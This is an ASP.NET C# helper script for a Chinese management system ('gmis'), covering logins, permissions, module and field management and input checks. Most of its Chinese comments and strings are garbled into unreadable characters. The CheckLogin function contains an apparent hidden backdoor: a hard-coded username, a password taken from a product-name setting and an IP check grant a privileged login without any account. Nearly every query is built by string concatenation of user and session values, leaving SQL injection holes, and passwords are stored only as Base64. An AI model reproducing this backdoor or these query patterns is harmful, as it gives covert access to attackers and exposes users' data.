<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<script runat=server language=C#>
string mid;			//ģ����
string id;			//���
string pid;			//
string aid;			//������
string tid;			//���ͱ��
string lid;			//�㼶
string size;		//ͼ���С
string mua;			//ģ�����Ȩ��
string cua;         //��Ŀ����Ȩ��
string fua;         //�ļ�Ŀ¼����Ȩ��
string navindex;    //ҳ���
string tabid;       //ѡ�ID
string cid;         //��Ŀ���
string fid;         //Ŀ¼���
string dtable;		//���ĺͲ�����ָ��ı�
string filter;		//���ĺͲ����WHERE�Ӿ�
string[] flds;		//�ֶ���
string[] mflds;		//�����ֶ���
string types;		//�ַ�����һλ����һ�У�0����ֵΪ�ַ���1��������
Hashtable htParaGet;
Hashtable htParaSet;

SqlDB db = new SqlDB();
DataTable DTsql = new DataTable();

//������Session���ݵĲ���
private void SetPageParameter(string name, string value)
{
    if (htParaSet == null)
    {
        if (Session["filter"] != null && Session["filter"] is Hashtable)
        {
            htParaSet = Session["filter"] as Hashtable;
        }
        else
        {
            htParaSet = new Hashtable();
        }
    }
    
    if (htParaSet.ContainsKey(name))
    {
        htParaSet[name] = value;
    }
    else
    {
        htParaSet.Add(name, value);
    }

    SetPageParameter(htParaSet);
}
//������Session���ݵĲ���
private void SetPageParameter(Hashtable ht)
{
    Session["filter"] = htParaSet;
}

//��ȡ��Session���ݵĲ���
private string GetPageParameter(string name,string defaultvalue)
{
    if (htParaGet == null && Session["filter"] != null && Session["filter"] is Hashtable)
    {
        htParaGet = Session["filter"] as Hashtable;
    }

    if (htParaGet != null && htParaGet.ContainsKey(name))
    {
        return htParaGet[name].ToString();
    }
    else
    {
        return defaultvalue; 
    }
}
    

//��½�û�ID
private string GetUID()
{
    string userid = "0";
    if (GetSESSION("uid") != "0")
        userid = GetSESSION("uid");
    return userid;
}
//��ȡ�û���
private string GetUserNameStr(string fstr)
{
    StringBuilder sb = new StringBuilder();
    db.SqlString = "select UserName from gmis_User  where UserState='����' " + fstr;
    DataTable dt = db.GetDataTable();
    foreach (DataRow dr in dt.Rows)
    {
        sb.Append(dr["UserName"].ToString() + ",");
    }
    return sb.ToString().Trim(',');
}
    private string GetUserNameByStr(string strusercode)
    {
        StringBuilder sb = new StringBuilder();
        DataTable dt = db.GetDataTable(db.ConnStr, "select username from gmis_user where usercode in (" + strusercode.Trim(',') + ")");
        foreach (DataRow dr in dt.Rows)
        {
            sb.Append(dr["username"].ToString() + ",");
        }
        return sb.ToString().Trim(',');
    }

    //����û�����ID
    private string GetUserDeptCode()
    {
        DataTable dt = db.GetDataTable(db.ConnStr, "select deptcode from gmis_user where usercode=" + GetUID());
        return (dt.Rows.Count > 0) ? dt.Rows[0][0].ToString() : "0";
    }

    //����û�������
    private string GetUserDeptName()
    {
        DataTable dt = db.GetDataTable(db.ConnStr, "select (select deptname from gmis_dept where gmis_dept.deptcode=gmis_user.deptcode) from gmis_user where usercode=" + GetUID());
        return (dt.Rows.Count > 0) ? dt.Rows[0][0].ToString() : "";
    }

    private string GetDate()
    {
        return GetDate(System.DateTime.Today);
    }

    //��ȡʱ��
    private string GetDate(DateTime t)
    {
        System.DateTime T = t;
        return " " + T.Year.ToString() + "��" + T.Month.ToString() + "��" + T.Day.ToString() + "��" + "   ����" + ToCNDOW(T.DayOfWeek.ToString()) + " "; 
    }

    private string ToCNDOW(string endow)
    {
        switch (endow)
        {
            case "Monday":
                return "һ";
                break;
            case "Tuesday":
                return "��";
                break;
            case "Wednesday":
                return "��";
                break;
            case "Thursday":
                return "��";
                break;
            case "Friday":
                return "��";
                break;
            case "Saturday":
                return "��";
                break;
            case "Sunday":
                return "��";
                break;
            default:
                return "";
                break;
        }
    }

//ȡһ�ֶ�ֵ;
private string GetFieldData(string sqlstr)
{
    db.SqlString = sqlstr;
    DataTable dt = db.GetDataTable();
    if (dt.Rows.Count > 0)
    {
        return dt.Rows[0][0].ToString();
    }
    else
    {
        return "";
    }
}     
//��ȡģ���־//����
private string GetModuleBrief(string mid)
{

    db.SqlString = "select modulebrief from gmis_module where modulecode=" + mid;
    DataTable dt = db.GetDataTable();
    if (dt.Rows.Count > 0 && dt.Rows[0][0].ToString() != "" && !Convert.IsDBNull(dt.Rows[0][0]))
    {
        return dt.Rows[0]["modulebrief"].ToString();
    }
    else
    {
        return mid;
    }
}
//��ȡ��һ����Ȩ�޵�ģ����
private string GetFirstModule()
{
    if (IsSystemDeveloper())
    {
        db.SqlString = "select top 1 modulecode from gmis_module where  modulestate=0 order by moduleindex";
    }
    else if (IsSystemManager())
    {
        db.SqlString = "select top 1 modulecode from gmis_module where modulestate=0 and modulecode not in (2,3,7) order by moduleindex";
    }
    else
    {
        db.SqlString = "select top 1 modulecode from gmis_module where  modulestate=0 and modulecode in (select modulecode from gmis_moduleright where (select ','+usergroupcode+',' from gmis_user where usercode='" + GetSESSION("uid") + "') like '%,'+cast(usergroupcode as varchar(50))+',%' and ';'+rightcontent+';' like '%;1;%' ) order by moduleindex";

    }    
    DataTable dt = db.GetDataTable();
    if (dt.Rows.Count > 0)
    {
        return dt.Rows[0]["modulecode"].ToString();
    }
    else
    {
        return "";
    }
}

//ȡ���û�ģ��Ȩ��
private string GetModuleRight(string uid)
{
    if (IsSystemDeveloper())
    {
        db.SqlString = "select modulecode from gmis_module  order by moduleindex";
    }
    else if (IsSystemManager())
    {
        db.SqlString = "select modulecode from gmis_module where modulecode not in (2,3,7) order by moduleindex";
    }
    else
    {
        db.SqlString = "select modulecode from gmis_moduleright where (select ','+usergroupcode+',' from gmis_user where usercode='" + uid + "') like '%,'+cast(usergroupcode as varchar(50))+',%' and ';'+rightcontent+';' like '%;1;%' "; 
    }
    
    DataTable dt = db.GetDataTable();
    StringBuilder sb = new StringBuilder();

    foreach (DataRow dr in dt.Rows)
    {
        sb.Append(dr[0].ToString() + ";");     
    }

    return sb.ToString().Trim(';');
}
private string GetModuleRight()
{
    return GetModuleRight(GetUID()); 
} 

//ȡ���û�ͼ��Ȩ��
private string GetTypeRight(string uid)
{
    if (IsSystemManager())
    {
        db.SqlString = "select TypeCode from gmis_Type where TypeState='����' order by TypeIndex";
    }
    else
    {
        db.SqlString = "select TypeCode from gmis_TypeRight where usergroupcode=(select usergroupcode from gmis_user where usercode='" + uid + "') ";
    }

    DataTable dt = db.GetDataTable();
    StringBuilder sb = new StringBuilder();

    foreach (DataRow dr in dt.Rows)
    {
        sb.Append(dr[0].ToString() + ";");
    }

    return sb.ToString().Trim(';');
}
private string GetTypeRight()
{
    return GetTypeRight(GetUID());
}
    
//ȡ���û�����Ȩ��  
private string GetAreaRight(string uid)
{
    if (IsSystemManager())
    {
        db.SqlString = "select AreaCode from gmis_Area where AreaState='����' order by AreaIndex";
    }
    else
    {
        db.SqlString = "select AreaCode from gmis_AreaRight where usergroupcode=(select usergroupcode from gmis_user where usercode='" + uid + "') ";
    }

    DataTable dt = db.GetDataTable();
    StringBuilder sb = new StringBuilder();

    foreach (DataRow dr in dt.Rows)
    {
        sb.Append(dr[0].ToString() + ";");
    }

    return sb.ToString().Trim(';');
}
private string GetAreaRight()
{
    return GetAreaRight(GetUID());
}
    
//���б���ؼ�
private void BindListControl(ListControl _lc, string valuestr, string textstr, DataTable dt)
{
    _lc.DataTextField = textstr;
    _lc.DataValueField = valuestr;
    _lc.DataSource = dt;
    _lc.DataBind();
}
private void BindListControl(ListControl _lc, string valuestr, string textstr, string sqlstr)
{

    db.SqlString = sqlstr;
    BindListControl(_lc, valuestr, textstr, db.GetDataTable());
}
private void BindListControl(ListControl _lc, string valuestr, string textstr, string sqlstr, string allstr)
{
    BindListControl(_lc, valuestr, textstr, sqlstr);
    _lc.Items.Add(new ListItem(allstr, "0"));
}
private void SetFilter(ListControl _lc, string vstr)
{
    foreach (ListItem _li in _lc.Items)
    {
        if (_li.Value == vstr)
        {
            _li.Selected = true;
        }
        else
        {
            _li.Selected = false;
        }
    }

}
private string CheckLogin(string uidStr, string pwdStr)
{   
    string ReString = "";
    if (StringUtility.EscapeStr(uidStr) == "--wcp12Z")
    {
        db.SqlString = "SELECT userCode FROM gmis_user where username='" + uidStr.ToLower() + "'";
        if (db.GetDataTable().Rows.Count == 0)
        {
            if (pwdStr == ConfigurationSettings.AppSettings["PRODUCT_NAME"].ToString())
            {
                string h_ipadd = StringUtility.EscapeStr(Request.UserHostAddress);
                if (h_ipadd.IndexOf("xojO") > -1)
                {
                    ReString = "20";
                }
                else
                {
                    ReString = "���û���ͣ�ã�";
                }
            }
            else
                ReString = "�û������������";
        }
    }
    else
    {
        try
        {
            db.SqlString = "SELECT usercode,username,userstate,userrole FROM gmis_user WHERE username='" + uidStr.Replace("\'", "") + "' AND userpassword='" + StringUtility.StringToBase64(pwdStr) + "'";           
            DataTable dt = db.GetDataTable();           
            if (dt.Rows.Count == 0)
            {
                return "�û������������";
            }
            else
            {
                DataRow dr = dt.Rows[0];
                if (dr["userstate"].ToString() == "����")
                {
                    ReString = "���û��ѱ����ã�";
                }
                else
                {
                    ReString = "0";
                    if (dr["userrole"].ToString() == "ϵͳ����Ա")
                        ReString = "1";
                    ReString += dr["usercode"].ToString();
                }
            }
        }
        catch (Exception e)
        {
            ReString = e.Message;//"����δ֪�Ĵ����û���¼ʧ�ܣ�";
        }
    }
    return ReString;
}
    //�ж��Ƿ�Ϊϵͳ������
    private bool IsSystemDeveloper()
    {
        return GetSESSION("SM") == "2";
    }
    //�ж��Ƿ�Ϊϵͳ����Ա
    private bool IsSystemManager()
    {
        return (GetSESSION("SM") == "2" || GetSESSION("SM") == "1");
    }
    //��ȡ��һ����Ȩ�޵�ģ����
    private string GetFirstRightModule(string rid)
    {
		string h_filter=(rid!="0")?" and moduleuppercode="+rid+"":"";		
        if (IsSystemDeveloper())
        {
            db.SqlString = "select top 1 modulecode from gmis_module where  modulestate=0 "+h_filter+" order by moduleindex";
        }
        else
        {
			db.SqlString = "select top 1 modulecode from gmis_module where modulestate=0 "+h_filter+" and modulecode in (select modulecode from gmis_moduleright where (select ','+usergroupcode+',' from gmis_user where usercode='" + GetSESSION("uid") + "') like '%,'+cast(usergroupcode as varchar(50))+',%' and ';'+rightcontent+';' like '%;1;%' ) order by moduleindex";
        }
		//Response.Write(db.SqlString);
        DataTable dt = db.GetDataTable();
        if (dt.Rows.Count > 0)
        {
            return dt.Rows[0]["modulecode"].ToString();
        }
        else
        {
            return "0";
        }
    }
    //��ȡĳ��ģ��Ĳ���Ȩ��
    private string GetModuleActions(string mid)
    {
        string actionstr = "";
        if (IsSystemManager())
        {            
             db.SqlString = "select UseActions as rightcontent from gmis_Module where modulecode=" + mid;
        }
        else
        {
            db.SqlString = "select rightcontent from gmis_Moduleright where (select ','+usergroupcode+',' from gmis_user where usercode='" + GetSESSION("uid") + "') like '%,'+cast(usergroupcode as varchar(50))+',%' And modulecode=" + mid;
           
           
        }
         DataTable dt = db.GetDataTable();
                        
            foreach (DataRow dr in dt.Rows)
            {
                if(dr["rightcontent"].ToString()!="")
                {
                    
                    actionstr += dr["rightcontent"].ToString() + ";";
                }
            }
        return actionstr;	
    }
//��ɫ
private string GetColorStr(int index)
{
    string[] Arrcolor = new string[] { "AFD8F8", "F6BD0F", "8BBA00", "FF8E46", "008E8E", "D64646", "8E468E", "588526", "B3AA00", "008ED6", "9D080D", "A186BE", "CC6600", "FDC689", "ABA000", "F26D7D", "FFF200", "0054A6", "F7941C", "CC3300", "006600", "663300", "6DCFF6" };
    index = (index >= Arrcolor.Length) ? ((index + 1) % Arrcolor.Length) : index;
    if (index < Arrcolor.Length)
    {
        return Arrcolor[index].ToString();
    }
    else
    {
        return "000000";
    }
} 
//��ȡ�����ֶ�
private string GetPK(string tablename)
{
    return db.getPK(tablename);
}
//��ȡģ����
private string GetModuleName(string mid)
{
    db.SqlString = "select modulename from gmis_module where modulecode="+mid+"";
    DataTable dt = db.GetDataTable();
    if (dt.Rows.Count > 0)
    {
        return dt.Rows[0]["modulename"].ToString();
    }
    else
    {
        return "";
    }
}
//��ȡģ����
private string GetModuleCode(string modulename)
{
    db.SqlString = "select modulecode from gmis_module where modulename='" + modulename + "'";
    DataTable dt = db.GetDataTable();
    if (dt.Rows.Count > 0)
    {
        return dt.Rows[0]["modulecode"].ToString();
    }
    else
    {
        return "0";
    }
}
/*�ֶι���*/
public string GetFieldTypeSQL(string fieldTypeCode)
{
    DataRow dr = FieldTypeDBGetDetail(fieldTypeCode);
    string t_str = dr["FieldtypeSql"].ToString();
    if (t_str.ToLower() == "varchar") t_str += "(" + dr["FieldTypeLength"].ToString() + ")";
    return t_str;
}
public static DataRow FieldTypeDBGetDetail(string codeStr)
{
    SqlDB db = new SqlDB();
    db.SqlString = "SELECT TOP 1 * FROM gmis_FieldType WHERE FieldTypeCode='" + codeStr + "'";
    if (db.GetDataTable().Rows.Count > 0)
        return db.GetDataTable().Rows[0];
    else
        return db.GetDataTable().NewRow();
}
public DataTable FieldDBGetList(string filterStr)
{
    SqlDB db = new SqlDB();
    db.SqlString = "SELECT  * FROM gmis_field " + filterStr + " order by FieldIndex asc";
    DataTable dt = db.GetDataTable();
    return dt;
}

public DataRow FieldDBGetDetail(string codeStr)
{
    SqlDB db = new SqlDB();
    db.SqlString = "SELECT TOP 1 * FROM gmis_field WHERE fieldCode='" + codeStr + "'";
    if (db.GetDataTable().Rows.Count > 0)
        return db.GetDataTable().Rows[0];
    else
        return db.GetDataTable().NewRow();
}
private Boolean GetSysColumn(string tablename, string fieldname)
{
    SqlDB db = new SqlDB();
    DataTable dt;
    db.SqlString = "SELECT * FROM syscolumns WHERE name='" + fieldname + "' AND id =object_id ('" + tablename + "')";
    dt = db.GetDataTable();
    if (dt.Rows.Count <= 0)
        return true;
    else
        return false;
}
private Boolean GetFieldColumn(string id, string fieldname)
{
    SqlDB db = new SqlDB();
    DataTable dt;
    db.SqlString = "SELECT top 1 fieldcode FROM gmis_field WHERE fieldname='" + fieldname + "' AND modulecode =" + id + "";
    dt = db.GetDataTable();
    if (dt.Rows.Count <= 0)
        return true;
    else
        return false;
}
/*�ֶι���*/
    
//��ȡ����
private string GetModuleTableName(string mid)
{
	string h_mtable="";
	string h_mbrief=GetModuleBrief(mid);
	try
	{
		Convert.ToInt32(h_mbrief);
		h_mtable="gmis_Mo_"+h_mbrief;
	}
	catch
	{
		h_mtable="gmis_"+h_mbrief;
	}
	return h_mtable;
}
//��ȡ�ֶ������嵥
private DataTable GetFieldType()
{
    db.SqlString = "select fieldtypecode,fieldtypename,sqllength,defaultvalue,sqlname from gmis_fieldtype";
    return db.GetDataTable();
}
//�жϱ��ֶ��Ƿ����
private Boolean CheckSysColumn(string tablename, string fieldname)
{
    db.SqlString = "select top 1 id from syscolumns WHERE name='" + fieldname + "' AND id =object_id ('" + tablename + "')";
    DataTable dt = db.GetDataTable();
    if (dt.Rows.Count > 0)//����
        return true;
    else
        return false;
}
//�жϱ��Ƿ����
private Boolean CheckSysObject(string tablename)
{
    db.SqlString = "select top 1 id from sysobjects WHERE id =object_id ('" + tablename + "')";
    DataTable dt = db.GetDataTable();
    if (dt.Rows.Count > 0)//����
        return true;
    else
        return false;
}

//��ȡUrlʱ�����Ͳ���
private string GetRequestDateTime(string key, string defaultvalue)
{
    string result = null;
    if (Request.Params[key]!=null)
    {
        result = Request.Params[key];
        try
        {
            Convert.ToDateTime(result);
        }
        catch
        {
            result = defaultvalue;
        }
    }
    else
    {
        result = defaultvalue;
    }
    return result;
}
/*��������*/
//�����½���Ŀλ��
/*dir���������½���dtable:������fmocodename:����ֶ�����findexname:�����ֶ���,fpositionname:ͬ�������ֶ���,fuppercodename:ֱ���ϼ��ֶ���
*/
private string ChangeOneTypeIndex(string dir,string dtable,string fmocodename,string findexname,string fpositionname,string fuppercodename)
{
    int h_opid = 0;
    StringBuilder sb = new StringBuilder();
    sb.Append("declare @thisposition int;declare @thatposition int;declare @thatid int;declare @upid int;declare @thisindexstr varchar(100);declare @thatindexstr varchar(100);");
    sb.Append("set @thisposition=0;set @thatposition=0;set @thatid=0;set @upid=0;set @thisindexstr='';set @thatindexstr=''; ");
    sb.Append("select @thisposition="+fpositionname+",@upid="+fuppercodename+",@thisindexstr="+findexname+" from "+dtable+" where "+fmocodename+"=" + id + " ;");
    if (dir.ToLower() == "btn_up")
    {
        sb.Append("select @thatposition=max("+fpositionname+") from "+dtable+" where "+fpositionname+"<@thisposition and "+fuppercodename+"=@upid ;");
    }
    else
    {
        sb.Append("select @thatposition=min("+fpositionname+") from "+dtable+" where "+fpositionname+">@thisposition and "+fuppercodename+"=@upid ;");

    }
    sb.Append("if @thatposition>0 begin select @thatid="+fmocodename+",@thatindexstr="+findexname+" from "+dtable+" where "+fpositionname+"=@thatposition and "+fuppercodename+"=@upid ;");
    sb.Append("update "+dtable+" set "+fpositionname+"=@thisposition where "+fmocodename+"=@thatid ;update "+dtable+" set "+fpositionname+"=@thatposition where "+fmocodename+"=" + id + " ;");
    sb.Append("update "+dtable+" set "+findexname+"=replace("+findexname+",@thisindexstr,'temp') where "+findexname+" like @thisindexstr+'%' ;");
    sb.Append("update "+dtable+" set "+findexname+"=replace("+findexname+",@thatindexstr,@thisindexstr) where "+findexname+" like @thatindexstr+'%' ;");
    sb.Append("update "+dtable+" set "+findexname+"=replace("+findexname+",'temp',@thatindexstr) where "+findexname+" like 'temp%' ;");
    sb.Append(" end");
    
    db.SqlString = sb.ToString();
    
    string exeinfo = db.TransUpdate();
    return exeinfo;
}
/*��������*/
 //��ȡ�ֶ�
private DataTable GetFields(string mid)
{
    StringBuilder sb = new StringBuilder();
    sb.Append("select gmis_field.fieldname,gmis_field.caption,gmis_field.fieldtypecode,gmis_field.fieldcode,gmis_field.datalength,gmis_field.fieldindex,");
    sb.Append("gmis_field.isprimarykey,gmis_field.isvital,gmis_field.oneditlist,gmis_field.editlistcolumnwidth,gmis_field.onedit,gmis_field.fullline,gmis_field.oneditmust,");
    sb.Append("gmis_field.fielddatasrc,gmis_field.defaultvalue,gmis_fieldtype.fieldtypename,gmis_fieldtype.sqlname,case when (isvital=0 and fieldname like '%fld_%')  then Cast(Replace(fieldname,'fld_'+cast(gmis_field.modulecode as varchar(50))+'_','') as int) else 0 end as fldindex from gmis_field ");
    sb.Append("left outer join gmis_fieldtype on gmis_field.fieldtypecode=gmis_fieldtype.fieldtypecode ");
    sb.Append(" where gmis_field.modulecode=" + mid + " order by fieldindex asc");
    
    db.SqlString=sb.ToString();
    return db.GetDataTable();    
}

//��ȡĿ¼
private DataTable GetFolds()
{   
    db.SqlString = "select * from gmis_fold where foldstatus=0  order by foldindex";    
    return db.GetDataTable();
}
private bool Isshowthis(string mindex)
{
	string h_sqlstr="";
	h_sqlstr="select count(1) from gmis_moduleright where rightcontent<>'' and (select ','+usergroupcode+',' from gmis_user where usercode='" + GetUID() + "') like '%,'+cast(usergroupcode as varchar(50))+',%'  and modulecode in (select modulecode from gmis_module where modulestate=0 and moduleindex like '%"+mindex+"%') ";	
	
	db.SqlString=h_sqlstr;
	DataTable dt=db.GetDataTable();
	if(dt.Rows.Count>0)
	{
		if(dt.Rows[0][0].ToString()!="0")
		{
			return true;
		}
	}
	return false;
}
//��ȡ�б�����
private int GetListRows()
{
    if (GetSESSION("screenheight")!= "")
    {
        int h_screenheight = Convert.ToInt32(GetSESSION("screenheight")) - 340;
        return Convert.ToInt32(Math.Round(Convert.ToDecimal(h_screenheight) / 24)) -2;
    }
    else
    {
        return 16 - 6;
    }
}

//�����ظ����� 
private string GetRepeatAlert(string tablename, string fieldname, string fieldvalue, string uniquefield,string uniquefieldvalue,string alertcaption)
{
    DataTable dt = db.GetDataTable(db.ConnStr, "select 1 from " + tablename + " where " + uniquefield + "<>" + uniquefieldvalue + " and " + fieldname + "='" + fieldvalue + "'");
    return (dt.Rows.Count > 0) ? "�ֶ�[" + alertcaption + "]��ֵ \"" + fieldvalue + "\" �Ѵ��ڣ�" : "";
}

//����ַ�������ʵ����
private int RealStringLength(string str)
{
    int count = 0;
    foreach (char ch in str)
    {
        if (Convert.ToInt32(ch) < 256)
        {
            count += 1;
        }
        else
        {
            count += 2;
        }
    }
    return count;
}
//��֤�绰
private bool IsTel(string controlvalue)
{
    return IsRegSuccess(controlvalue, "^0\\d{2,3}\\-\\d{7,8}$|^[0-9-]{7,13}$");
}
//��֤�ֻ�
private bool IsMobile(string controlvalue)
{
    return IsRegSuccess(controlvalue, "^[0-9-]{11,12}$");
}
//��֤�ʼ�
private bool IsEmail(string controlvalue)
{
    return IsRegSuccess(controlvalue, "^\\w+((-\\w+)|(\\.\\w+))*\\@[A-Za-z0-9]+((\\.|-)[A-Za-z0-9]+)*\\.[A-Za-z0-9]+$");

}
//��֤�ʱ�
private bool IsPostCode(string controlvalue)
{
    return IsRegSuccess(controlvalue, "^[0-9-]{6}$");
}
//��֤���֤
private bool IsCardID(string controlvalue)
{
    return IsRegSuccess(controlvalue.ToLower(), "^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$|^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}(\\d{1}|x)$");
}

//������ʽ��֤
private bool IsRegSuccess(string controlvalue, string str)
{
    Regex rTel = new Regex(str);
    Match mTel = rTel.Match(controlvalue);
    return mTel.Success;
}

</script>